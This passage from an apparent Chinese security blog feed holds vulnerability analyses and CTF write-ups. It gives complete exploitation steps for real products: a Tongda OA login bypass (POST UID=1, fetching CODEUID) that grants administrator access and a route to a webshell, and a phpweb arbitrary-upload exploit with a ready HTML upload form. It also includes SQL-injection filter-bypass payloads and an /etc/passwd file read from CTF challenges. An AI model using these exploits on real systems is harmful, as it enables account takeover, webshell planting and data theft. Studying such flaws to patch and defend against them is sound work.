class="line">xxx/logincheck_code.php</div><div class="line"></div><div class="line">POST:UID=1</div><div class="line"></div><div class="line">之后访问xxx/general/index.php即可获取系统管理员权限</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200422/AHJdAEDlkH6Y.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/o8zdvzknmwjW.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200422/xbCnkhHk3VoW.png?imageslim" alt="mark"></p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>访问xxx/logincheck_code.php，若返回<code>{&quot;status&quot;:1,&quot;msg&quot;:&quot;&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>的信息，基本可以确定存在漏洞<br><img src="http://pic.c1imber.top/blog/20200422/wfoUXXGfK0qe.png?imageslim" alt="mark"></p><p>影响范围还是挺大的，当进入后台后，可以在后台数据库管理的位置通过general_log获取网站的webshell</p><p>网站根目录的获取：系统管理-&gt;系统参数设置-&gt;OA服务设置</p><h3 id="2020-4-24补充"><a href="#2020-4-24补充" class="headerlink" title="2020.4.24补充"></a>2020.4.24补充</h3><p>终于下载到了通达OAv11.4版本：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe" title="下载链接" target="_blank" rel="external">下载链接</a></p><p>查看漏洞位置logincheck_code.php,对比之前分析的v11.3和2017版本，可以看到增加了对<code>CODE_LOGIN.$CODEUID</code>的判断:<br><img src="http://pic.c1imber.top/blog/20200424/uvUkptTOx2mB.png?imageslim" alt="mark"></p><p>当<code>$login_codeuid = TD::get_cache(&quot;CODE_LOGIN&quot; . $CODEUID);</code>不存在或者为空时，会输出<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;参数错误&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>并退出程序，所以这里如果想登录，除了需要POST传入UID=1以外，还需要传入<code>CODEUID</code></p><p>全局查找<code>CODE_LOGIN</code>，在general/login_code.php当中，程序通过<code>$login_codeuid = getUniqid();</code>生成了<code>CODE_LOGIN</code>存入了缓存并输出<br><img src="http://pic.c1imber.top/blog/20200424/d0LKr0OdhY3L.png?imageslim" alt="mark"></p><p>这里就可以通过直接访问general/login_code.php获取缓存当中的<code>CODE_LOGIN</code>,通过获取到的<code>CODE_LOGIN</code>绕过logincheck_code.php的判断，获取系统管理员的登录权限</p><h3 id="v11-4版本漏洞检测及利用"><a href="#v11-4版本漏洞检测及利用" class="headerlink" title="v11.4版本漏洞检测及利用"></a>v11.4版本漏洞检测及利用</h3><p>直接访问logincheck_code.php，如果返回<code>{&quot;status&quot;:0,&quot;msg&quot;:&quot;\u53c2\u6570\u9519\u8bef\uff01&quot;,&quot;url&quot;:&quot;general\/index.php?isIE=0&quot;}</code>,则说明有可能存在漏洞</p><p>请求/general/login_code.php,获取codeuid<br><img src="http://pic.c1imber.top/blog/20200424/769EytU6Glfn.png?imageslim" alt="mark"></p><p>访问logincheck_code.php，POST传入UID=1和CODEUID=获取到的codeuid,即可获取系统管理员的登录权限<br><img src="http://pic.c1imber.top/blog/20200424/FciVx00ABsob.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200424/C4tSEqmgvdDY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通达OA任意用户登录&quot;&gt;&lt;a href=&quot;#通达OA任意用户登录&quot; class=&quot;headerlink&quot; title=&quot;通达OA任意用户登录&quot;&gt;&lt;/a&gt;通达OA任意用户登录&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>phpweb前台任意文件上传</title>
    <link href="https://c1aysec.github.io/2020/01/10/phpweb%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://c1aysec.github.io/2020/01/10/phpweb前台任意文件上传/</id>
    <published>2020-01-09T16:07:20.714Z</published>
    <updated>2020-01-09T16:41:55.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpweb前台任意文件上传"><a href="#phpweb前台任意文件上传" class="headerlink" title="phpweb前台任意文件上传"></a>phpweb前台任意文件上传</h1><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在漏洞的代码位置：</p><p>/base/appplus.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//密钥校验</span></div><div class="line">$k=md5(strrev($dbUser.$dbPass));</div><div class="line">$h=$_SERVER[<span class="string">"HTTP_REFERER"</span>];</div><div class="line">$t=$_POST[<span class="string">"t"</span>];</div><div class="line">$m=$_POST[<span class="string">"m"</span>];</div><div class="line">$act=$_POST[<span class="string">"act"</span>];</div><div class="line">$path=$_POST[<span class="string">"path"</span>];</div><div class="line"></div><div class="line">$md5=md5($k.$t);</div><div class="line"><span class="keyword">if</span>($m!=$md5)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR: 安全性校验错误"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//文件上传</span></div><div class="line"><span class="keyword">if</span>($act==<span class="string">"upload"</span>)&#123;</div><div class="line"></div><div class="line">$file=$_FILES[<span class="string">"file"</span>];</div><div class="line">$r_size=$_POST[<span class="string">"r_size"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>] &gt; <span class="number">0</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"ERROR"</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">  <span class="keyword">exit</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>]!=$r_size)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:上传文件错误，文件大小和原文件不匹配"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: 上传文件错误，文件大小和原文件不匹配\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//检查目录名</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($path!=<span class="string">""</span>)&#123;</div><div class="line">$ToPath=<span class="string">"../"</span>.$path;</div><div class="line">$Tofile=$ToPath.<span class="string">"/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"><span class="keyword">if</span>(!is_dir($ToPath))&#123;</div><div class="line">@mkdir($ToPath,<span class="number">0777</span>);</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ToPath=<span class="string">"../update/"</span>;</div><div class="line">$Tofile=<span class="string">"../update/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!is_writable($ToPath))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_exists($Tofile) &amp;&amp; !is_writable($Tofile))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//复制文件</span></div><div class="line">copy($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$Tofile);</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>])&#123;</div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"application/octet-stream"</span>:</div><div class="line">@chmod($Tofile,<span class="number">0755</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line">@chmod($Tofile,<span class="number">0666</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"文件上传成功: "</span> .substr($Tofile,<span class="number">3</span>);</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" 文件上传成功: "</span>.substr($Tofile,<span class="number">3</span>).<span class="string">"\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里存在任意文件上传，但是前提是需要通过密钥校验</p><p><img src="http://pic.c1imber.top/blog/20200110/axlunRoNQX9I.png?imageslim" alt="mark"></p><p>这里的<code>$m</code>和<code>$t</code>都是可控的，如果可以在代码当中找到<code>$k</code>的值，就可以通过密钥校验</p><p>通过全局搜索<code>md5(strrev($dbUser.$dbPass))</code>可以在/base/post.php找到该值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">$act = $_POST[<span class="string">'act'</span>];</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($act)&#123;</div><div class="line">...</div><div class="line">...</div><div class="line"><span class="keyword">case</span> <span class="string">"appcode"</span> :</div><div class="line">$pluslable=$_POST[<span class="string">'pluslable'</span>];</div><div class="line">$apptype=$_POST[<span class="string">'apptype'</span>];</div><div class="line">$coltype=$_POST[<span class="string">'coltype'</span>];</div><div class="line">$tempid=$_POST[<span class="string">'tempid'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"plus"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_plusdefault where `pluslable`='$pluslable'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_coltype where `coltype`='$coltype'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"2000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"border"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_border where `tempid`='$tempid'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$code=<span class="string">"k="</span>.md5(strrev($dbUser.$dbPass)).<span class="string">"&amp;t="</span>.time();</div><div class="line"><span class="keyword">echo</span> $code;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>step1:获取<code>$k</code>:<code>md5(strrev($dbUser.$dbPass))</code></p><p><a href="http://192.168.157.130/phpweb/3151/base/post.php" target="_blank" rel="external">http://192.168.157.130/phpweb/3151/base/post.php</a><br>post：act=appcode<br><img src="http://pic.c1imber.top/blog/20200110/Wr17MV9wp8aG.png?imageslim" alt="mark"></p><p>step2:通过<code>$k</code>构造<code>$m</code>和<code>md5($k.$t)</code>,使<code>$m===$md5</code><br><img src="http://pic.c1imber.top/blog/20200110/U5wkxGxKhYDL.png?imageslim" alt="mark"></p><p>step3:构造上传exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.157.130/phpweb/3151/base/appplus.php"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"m"</span> <span class="attr">value</span>=<span class="string">"26478db11a74b3c8675f463fee30cba7"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"t"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"r_size"</span> <span class="attr">value</span>=<span class="string">"18"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"18"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><p>本地构造好上传页面直接上传即可</p><p>注意这里<code>$_POST[&#39;r_size&#39;]</code>要和<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>大小相等（字节）</p><p><img src="http://pic.c1imber.top/blog/20200110/ojRmuDjY4Qsz.png?imageslim" alt="mark"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7053" title="phpweb前台任意文件上传" target="_blank" rel="external">https://xz.aliyun.com/t/7053</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpweb前台任意文件上传&quot;&gt;&lt;a href=&quot;#phpweb前台任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;phpweb前台任意文件上传&quot;&gt;&lt;/a&gt;phpweb前台任意文件上传&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf记录-记一次有趣的注入</title>
    <link href="https://c1aysec.github.io/2019/11/03/ctf%E8%AE%B0%E5%BD%95-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</id>
    <published>2019-11-03T02:29:00.000Z</published>
    <updated>2019-11-06T17:11:00.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p><p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p><p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p><p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p><p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p><p>选择union注入的话，总结出需要突破的几个点：</p><pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数2、注入不能使用逗号3、不能使用information_schema</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p><p>突破1：</p><p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p><p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p><pre><code>id=2&apos; union/**/select 1id=2&apos; union/**/select 1,2...    </code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p><p>突破2：</p><p>不能使用逗号，可以使用子查询绕过</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p><p>突破3：</p><p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p><p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p><p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p><p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p><pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p><p>拖延症真的很可怕</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;a href=&quot;#ctf记录-记一次有趣的注入绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;/a&gt;ctf记录-记一次有趣的注入绕过&lt;/h1&gt;&lt;p&gt;正常页面：&lt;br&gt;xxx/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019极客巅峰ctf记录</title>
    <link href="https://c1aysec.github.io/2019/10/20/2019%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2019/10/20/2019极客巅峰ctf记录/</id>
    <published>2019-10-19T16:50:00.000Z</published>
    <updated>2019-11-06T17:03:35.474Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019极客巅峰ctf记录"><a href="#2019极客巅峰ctf记录" class="headerlink" title="2019极客巅峰ctf记录"></a>2019极客巅峰ctf记录</h1><p><strong>周六抽时间做了2019极客巅峰的ctf,发现自己是真的菜，需要找个地方沉淀一下，所以将做出的题记录记录在博客</strong></p><h3 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h3><p><img src="http://pic.c1imber.top/blog/20191020/zY6KbGAP9u64.png?imageslim" alt="mark"></p><p><strong>提示admin才能看到flag1</strong><br><img src="http://pic.c1imber.top/blog/20191020/T16DhJOQLBjb.png?imageslim" alt="mark"></p><p><strong>发现注册处用户名参数存在二次注入，有过滤，使用`name=admin’/</strong>/and/<strong>/‘3`绕过</strong><br><img src="http://pic.c1imber.top/blog/20191020/2mtrs07TKjak.png?imageslim" alt="mark"><br><strong>注册成功，用户名：assssssssss@qq.com，密码：123456’,登录成功，成功获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/xlGk67iKvFUf.png?imageslim" alt="mark"></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这道题线上没做出来，比赛结束后研究了一波，:(</strong><br><img src="http://pic.c1imber.top/blog/20191019/VjLvacUQM2uY.png?imageslim" alt="mark"></p><p><strong>打开题目,首页有三个模块，分别为</strong></p><p><strong>查看文件：file.php?file=</strong><br><img src="http://pic.c1imber.top/blog/20191019/1aLGVXSWXCvO.png?imageslim" alt="mark"></p><p><strong>上传文件：upload_file.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/o2XlzFejE61c.png?imageslim" alt="mark"></p><p><strong>下载文件：download.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/KaNmoB7m2Jq9.png?imageslim" alt="mark"></p><p><strong>下载文件页面泄露了部分的源代码，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>这里存在文件下载漏洞，但是存在过滤，暂时无法绕过</strong></p><p><strong>查看页面源代码发现hint:提示flag文件的位置位于<code>/flag</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/10OYU1mrceLm.png?imageslim" alt="mark"></p><p><strong>回过头发现查看文件模块存在任意文件读取:<code>/file.php?file=/etc/passwd</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/4TclaUEmLrtg.png?imageslim" alt="mark"></p><p><strong>尝试直接读取flag文件。失败：</strong><br><img src="http://pic.c1imber.top/blog/20191019/T9xIQW4ABzPz.png?imageslim" alt="mark"></p><p><strong>尝试读取download.php:<code>/file.php?file=download.php</code>读取失败</strong><br><img 